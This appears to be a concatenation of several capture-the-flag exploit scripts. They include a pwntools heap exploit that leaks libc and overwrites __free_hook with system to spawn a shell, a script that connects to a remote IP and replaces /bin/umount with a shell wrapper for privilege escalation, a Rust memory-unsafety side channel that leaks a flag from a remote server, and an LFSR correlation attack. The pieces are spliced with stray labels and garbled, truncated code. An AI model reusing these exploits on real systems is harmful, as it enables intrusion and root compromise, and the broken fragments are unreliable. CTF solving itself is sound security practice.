payload = '\x09\x11\x99'
send(payload)
run()
x = r.recvuntil("\n")[:-1]
x = int(x,16)
free_got = 0x56557FBC - 0x56555000+x-0x6c0
babyhacker
ï¬‚ag
babyhacker2
print(hex(free_got))
free_libc = ''
for i in range(4):
    payload = swrite(3,free_got+i)+'\x53'+'\x99'+'\x99'
    send(payload)
    run()
    free_libc += r.recv(1)
libc = u32(free_libc) - 0x071470
print(hex(libc))
free_hook = 0xf7fb68b0-0xf7e03000+libc
system = 0xf7e3dda0-0xf7e03000+libc
for i in range(4):
    payload = swrite(3, free_hook+i) + '\x54'+'\x99'*2
    send(payload)
    run()
    r.send(p32(system)[i])
payload1 = '\x80'+chr(16)+'/bin'+'\x99'
send(payload1)
run()
payload2 = '\x80'+chr(17)+'/sh\x00'+'\x99'
send(payload2)
run()
free()
r.interactive()
from pwn import *
io = remote('121.36.215.224', 9001)
#ssh_io = ssh('pwn', '121.37.167.199', port = 10022,password='pwn')
#io = ssh_io.shell()
io.sendlineafter('$', 'cd /')
io.sendlineafter('$', 'rm /bin/umount')
io.sendlineafter('$', "echo '#!/bin/sh' > /bin/umount")
io.sendlineafter('$', "echo '/bin/sh' >> /bin/umount")
io.sendlineafter('$',"chmod +x /bin/umount")
io.sendlineafter('$',"exit")
io.sendline("cat /flag")
rustpad
io.interactive()
#ssh_io.close()
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from functools import wraps
import errno
import os
import signal
context.log_level = 'error'
class TimeoutError(Exception):
  pass
def timeout(seconds=10, error_message=os.strerror(errno.ETIME)):
  def decorator(func):
    def _handle_timeout(signum, frame):
      raise TimeoutError(error_message)
    def wrapper(*args, **kwargs):
      signal.signal(signal.SIGALRM, _handle_timeout)
      signal.alarm(seconds)
      try:
        result = func(*args, **kwargs)
      finally:
        signal.alarm(0)
      return result 
    return wraps(func)(wrapper)
  return decorator
code_tpl = '''static BS: usize = 0xaabbccdd;
static UNIT: &'static &'static () = &&();
fn foo(_: &'a &'b (), v: &'b T) -> &'a T {{ v }}
fn bad(x: &'a T) -> &'static T {{ let f: fn(_, &'a T) -> &'static T = 
foo; f(UNIT, x) }}
fn foow(_: &'a &'b (), v: &'b mut T) -> &'a mut T {{ v }}
fn badw(x: &'a mut T) -> &'static mut T {{ let f: fn(_, &'a mut T) -> 
&'static mut T = foow; f(UNIT, x) }}
fn jackpot() {{ let mut i: u64 = 0; while i  &'static Vec {{ let x = Box::new(Vec::new()); bad(&*x) }}
  let x = inner(); let mut y = Box::new((1usize, 2usize, 3usize));
  let mut i: usize = &BS as *const _ as usize; let mut r = |addr: usize| {{ 
y.0 = addr; x[0] }};
  let r32 = |r: &mut FnMut(usize) -> u8, x: usize| {{ let mut tmp = 0u32; for 
j in 0..4 {{ tmp |= (r(x+j) as u32)  u8, x: usize| {{ let mut tmp = 0u64; for 
j in 0..8 {{ tmp |= (r(x+j) as u64)  u32 {{ (x & 0xff000000) >> 24 | (x & 0x00ff0000) >> 08 | 
(x & 0x0000ff00)  {mid} {{ jackpot(); }} }}
}}'''
verify_tpl = '''static BS: usize = 0xaabbccdd;
static UNIT: &'static &'static () = &&();
fn foo(_: &'a &'b (), v: &'b T) -> &'a T {{ v }}
fn bad(x: &'a T) -> &'static T {{ let f: fn(_, &'a T) -> &'static T = 
foo; f(UNIT, x) }}
fn foow(_: &'a &'b (), v: &'b mut T) -> &'a mut T {{ v }}
fn badw(x: &'a mut T) -> &'static mut T {{ let f: fn(_, &'a mut T) -> 
&'static mut T = foow; f(UNIT, x) }}
fn jackpot() {{ let mut i: u64 = 0; while i  &'static Vec {{ let x = Box::new(Vec::new()); bad(&*x) }}
  let x = inner(); let mut y = Box::new((1usize, 2usize, 3usize));
  let mut i: usize = &BS as *const _ as usize; let mut r = |addr: usize| {{ 
y.0 = addr; x[0] }};
  let r32 = |r: &mut FnMut(usize) -> u8, x: usize| {{ let mut tmp = 0u32; for 
j in 0..4 {{ tmp |= (r(x+j) as u32)  u8, x: usize| {{ let mut tmp = 0u64; for 
j in 0..8 {{ tmp |= (r(x+j) as u64)  u32 {{ (x & 0xff000000) >> 24 | (x & 0x00ff0000) >> 08 | 
(x & 0x0000ff00) (_: &'a &'b (), v: &'b T) -> &'a T {{ v }}
fn bad(x: &'a T) -> &'static T {{ let f: fn(_, &'a T) -> &'static T = 
foo; f(UNIT, x) }}
fn foow(_: &'a &'b (), v: &'b mut T) -> &'a mut T {{ v }}
fn badw(x: &'a mut T) -> &'static mut T {{ let f: fn(_, &'a mut T) -> 
&'static mut T = foow; f(UNIT, x) }}
fn jackpot() {{ let mut i: u64 = 0; while i  &'static Vec {{ let x = Box::new(Vec::new()); bad(&*x) }}
  let x = inner(); let mut y = Box::new((1usize, 2usize, 3usize));
  let mut i: usize = &BS as *const _ as usize; let mut r = |addr: usize| {{ 
y.0 = addr; x[0] }};
  let r32 = |r: &mut FnMut(usize) -> u8, x: usize| {{ let mut tmp = 0u32; for 
j in 0..4 {{ tmp |= (r(x+j) as u32)  u8, x: usize| {{ let mut tmp = 0u64; for 
j in 0..8 {{ tmp |= (r(x+j) as u64)  u32 {{ (x & 0xff000000) >> 24 | (x & 0x00ff0000) >> 08 | 
(x & 0x0000ff00)  l:
    mid = (l + r) // 2
    code = code_tpl.format(index=index, mid=mid)
    print "Binsearch on %d with (%d, %d)" % (index, l, r)
    p = remote("159.138.4.209", 1001)
    try:
      conn_sidechannel(p, code)
    except TimeoutError:
      l = mid + 1
    except EOFError:
      r = mid 
    except Exception, ex:
      raise ex
    try:
      p.close()
    except:
      pass 
  return l
trophy = 'flag{2c9a594f-6e42-44e3-9767-fffc7deb0c32}'
index = len(trophy)
while not trophy.endswith('}'):
  trophy += chr(guess_char(index))
  index += 1
  print "Result:", trophy
print get_flag()
#for x1 in range(2):
#    for x2 in range(2):
#        for x3 in range(2):
#            print x1,x2,x3,(x1*x2)^((x2^1)*x3)
#n = [17,19,21]
#cycle = 1
#for i in n:
#    cycle = cycle*(pow(2,i)-1)
#print cycle
THREADS = 80
def lfsr(R, mask, lfsr_mask):
    output = (R > 1
    output ^= lastbit
    return (output, lastbit)
SAMPLE = 40
R1_mask = 0x2A9A0D
n1 = 22
R1_lfsrmask = 0x3FFFFF
R2_mask = 0x17FA06
n2 = 21
R2_lfsrmask = 0x1FFFFF
R3_mask = 0x5E5E6A
n3 = 23
R3_lfsrmask = 0x7FFFFF
def single_round():
    (R1_NEW, x1) = lfsr(R1, R1_mask, R1_lfsrmask)
    (R2_NEW, x2) = lfsr(R2, R2_mask, R2_lfsrmask)
    (R3_NEW, x3) = lfsr(R3, R3_mask, R3_lfsrmask)
    # change the following according the situration
    x2 = (~x2) & 1
    return (R1_NEW, R2_NEW, R3_NEW, (x1 * x2) ^ ((x2 ^ 1) * x3))
def get_data(length=40):
    data = open('./output_', "rb").read(length)
    data = ''.join(bin(256 + ord(c))[3:] for c in data)
    return data
def guess(beg, end, num, mask, lfsr_mask):
    data = get_data(num)
    target = int(len(data) * 0.75)
    ansn = range(beg, end)
    now = 0xffffffff
    res = 0
    for i in ansn:
        r = i
        cnt = 0
        for j in range(num * 8):
            r, lastbit = lfsr(r, mask, lfsr_mask)
            lastbit = str(lastbit)
            cnt += (lastbit == data[j])
        if abs(cnt - target) 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
using namespace std;
int val[64] = {
  52,
  2,
  44,
  42,
  6,
  42,
  47,
  42,
  51,
  3,
  2,
  50,
  50,
  50,
  48,
  3,
  1,
  50,
  43,
  2,
  46,